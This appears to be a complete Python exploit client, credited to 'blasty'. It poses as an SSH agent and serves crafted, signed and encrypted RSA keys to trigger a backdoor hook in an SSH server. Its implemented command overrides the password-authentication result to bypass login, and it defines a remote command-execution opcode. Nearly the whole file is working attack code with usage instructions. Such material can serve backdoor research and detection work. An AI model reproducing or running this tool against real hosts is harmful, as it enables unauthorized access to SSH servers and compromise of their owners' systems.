import os
import sys
import socket
import struct
import hashlib

from Crypto.Cipher import ChaCha20
from Crypto.PublicKey import ECC
from Crypto.Signature import eddsa

BACKDOOR2_CMD_OVERRIDE_MONITOR_AUTHPASSWORD_RESPONSE = 0x01
BACKDOOR2_CMD_EXEC_COMMAND = 0x03

SSH_AGENT_FAILURE = 5
SSH_AGENT_SUCCESS = 6
SSH_AGENTC_REQUEST_IDENTITIES = 11
SSH_AGENT_IDENTITIES_ANSWER = 12
SSH_AGENTC_EXTENSION = 27


pad = lambda v, n, b=b"\x00": v + b * (n - len(v)) if len(v) < n else v


class JiaTansSSHAgent:
    def __init__(self, path, ed448_keyfile):
        self.ed448_privkey = ECC.import_key(open(ed448_keyfile).read())
        self.ed448_pubkey = self.ed448_privkey.public_key()
        self.ed448_pubkey_bytes = self.ed448_pubkey.export_key(format="raw")

        self.session_id = None
        self.hostkey_pub = None
        self.server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.server.bind(path)
        self.server.listen(1)
        print("")
        print("[i] waiting for ssh agent requests..")

    def sign(self, blob):
        signer = eddsa.new(self.ed448_privkey, "rfc8032")
        return signer.sign(blob)

    def sshbuf_unchunk(self, buf):
        o = []
        pos = 0
        while pos < len(buf):
            if len(buf) - pos < 4:
                break
            olen = struct.unpack(">I", buf[pos : pos + 4])[0]
            pos = pos + 4
            assert pos + olen < len(buf)
            o.append(buf[pos : pos + olen])
            pos = pos + olen
        return o

    def chacha20_crypt(self, k, iv, data):
        c = ChaCha20.new(key=k, nonce=iv[4:])
        c.seek(struct.unpack("<L", iv[0:4])[0] * 0x40)
        return c.encrypt(data)

    def build_key_with_cert(self, new_n):
        # XXX: clean this up some day
        d = bytes.fromhex(
            "0000001c7373682d7273612d636572742d763031406f70656e7373682e636f6d00000000000000030100010000010101"
        )
        d += b"\x00" * 0x108
        d += b"\x00\x00\x00\x01"
        d += b"\x00" * 0x24
        d += struct.pack(">L", 0x114)
        d += bytes.fromhex("000000077373682d727361000000010100000100")
        d += new_n
        d += bytes.fromhex("00000010000000077373682d7273610000000100")
        return d

    def build_key(self, new_n):
        return (
            bytes.fromhex("000000077373682d72736100000003010001")
            + struct.pack(">L", len(new_n))
            + new_n
        )

    def bd1_request(self, a32, b32, c64, flags, body, n_size=0x100):
        assert len(flags) == 5

        hdr = struct.pack("<LLQ", a32, b32, c64)
        cmd_id = (c64 + (a32 * b32)) & 0xFFFFFFFF
        args_len = 0
        if cmd_id == 3:
            args_len = 0x30
        elif cmd_id == 2:
            if flags[0] & 0x80 == 0x80:
                args_len = 0x39
        args = body[0:args_len]
        args += b"\x00" * (args_len - len(args))
        if len(args) > len(body):
            payload = bytes(flags) + args
        else:
            payload = bytes(flags) + body
        assert len(payload) <= (n_size - 114)
        sig_buf = struct.pack("<L", (c64 + (a32 * b32)) & 0xFFFFFFFF)
        sig_buf += bytes(flags)
        sig_buf += args
        sig_buf += self.hostkey_pub
        sig_out = self.sign(sig_buf)
        o = hdr + self.chacha20_crypt(
            self.ed448_pubkey_bytes[0:32], hdr[0:0x10], sig_out + payload
        )
        return pad(o, n_size)

    def build_password_bypass_keys(self):
        # response in sshbuf wire format:
        # [len, MONITOR_ANS_AUTHPASSWORD, authenticated, maxtries]
        return self.build_keyallowed_backdoor_keys(
            BACKDOOR2_CMD_OVERRIDE_MONITOR_AUTHPASSWORD_RESPONSE,
            struct.pack(">LBLL", 9, 13, 1, 0),
        )

    def build_keyallowed_backdoor_keys(self, cmd_id, body):
        print("[>] building mm_answer_keyallowed hook trigger rsa key..")

        newkeys = [
            # ((0x40 * 0x80000000) + 0xffffffe000000000) & 0xffffffff == 0
            self.build_key_with_cert(
                self.bd1_request(
                    0x40, 0x80000000, 0xFFFFFFE000000000, [0, 0, 0, 0, 0], b"", 0x100
                )
            )
        ]

        MAGIC_SIZE = 0x200
        MAGIC_CHUNK_SIZE = 0x100

        p = self.ed448_pubkey_bytes + bytes([cmd_id])
        p += self.sign(p + self.hostkey_pub)

        body = struct.pack("<H", len(body)) + body
        p += body

        p += b"\x00" * ((MAGIC_SIZE - 0x120) - len(body))

        signature2_buf = (
            struct.pack("<H", MAGIC_SIZE) + p + self.session_id + self.hostkey_pub
        )
        p += self.sign(signature2_buf)

        p += b"\x00\x00"
        p = struct.pack("<H", len(p)) + p

        n = 0
        for i in range(0, len(p), MAGIC_CHUNK_SIZE):
            chunk = p[i : i + MAGIC_CHUNK_SIZE]
            chunk = struct.pack("<H", len(chunk)) + chunk
            iv = struct.pack("<L", 0x12345670 | i) + os.urandom(12)
            blob = pad(
                iv + self.chacha20_crypt(self.ed448_pubkey_bytes[0:32], iv, chunk),
                0x200,
            )
            print("[>] building magic ssh-rsa pubkey %d" % n)
            n += 1
            newkeys.append(self.build_key(blob))

        return newkeys

    def send_response(self, sock, response):
        length = struct.pack(">I", len(response))
        sock.sendall(length + response)

    def handle_request(self, sock):
        data = sock.recv(4)
        if not data:
            return False
        msg_len = struct.unpack(">I", data[:4])[0]
        data = b""
        while len(data) < msg_len:
            data += sock.recv(msg_len - len(data))

        msg_type = data[0]
        payload = data[1:]

        if msg_type == SSH_AGENTC_REQUEST_IDENTITIES:
            print("[i] agent got SSH_AGENTC_REQUEST_IDENTITIES")
            keys = self.build_password_bypass_keys()
            response = struct.pack("!BI", SSH_AGENT_IDENTITIES_ANSWER, len(keys))
            for k in keys:
                response += (
                    struct.pack(">I", len(k)) + k + struct.pack(">I", 4) + b"FUCK"
                )
            self.send_response(sock, response)
        elif msg_type == SSH_AGENTC_EXTENSION:
            print("[i] agent got SSH_AGENTC_EXTENSION")
            c = self.sshbuf_unchunk(payload)

            # TODO: is this always the correct indice order?
            assert len(c[1]) >= 0x10
            hostkey_type_len = struct.unpack(">L", c[1][0:4])[0]
            hostkey_type_str = c[1][4 : 4 + hostkey_type_len].decode()
            hostkey_body = c[1][4 + hostkey_type_len :]
            print("[i] hostkey type     : %s" % hostkey_type_str)
            self.hostkey_pub = hashlib.sha256(hostkey_body).digest()
            self.session_id = c[2]
            print("[i] got session id   : %s" % self.session_id.hex())
            print("[i] got hostkey salt : %s" % self.hostkey_pub.hex())
            self.send_response(sock, struct.pack(">BI", SSH_AGENT_SUCCESS, 0))
        else:
            print("[!] unsupported ssh agent request (%02x).." % msg_type)
            response = struct.pack("!B", SSH_AGENT_FAILURE)
            self.send_response(sock, response)
        return True

    def main(self):
        try:
            while True:
                client_sock, _ = self.server.accept()
                while self.handle_request(client_sock):
                    pass
                client_sock.close()
        finally:
            self.server.close()


def banner():
    print("")
    print("      $$$ Jia Tan's SSH Agent $$$  ")
    print("    -- by blasty <peter@haxx.in> --")
    print("")


if __name__ == "__main__":
    banner()

    if len(sys.argv) != 3:
        print("usage: %s <socket_path> <ed448_privkey.pem>\n" % sys.argv[0])
        exit(-1)

    agent_socket, privkey_path = sys.argv[1:]
    assert os.path.exists(privkey_path)
    if os.path.exists(agent_socket):
        os.unlink(agent_socket)
    print("[i] starting agent on '%s'" % agent_socket)
    agent = JiaTansSSHAgent(agent_socket, privkey_path)
    agent.main()
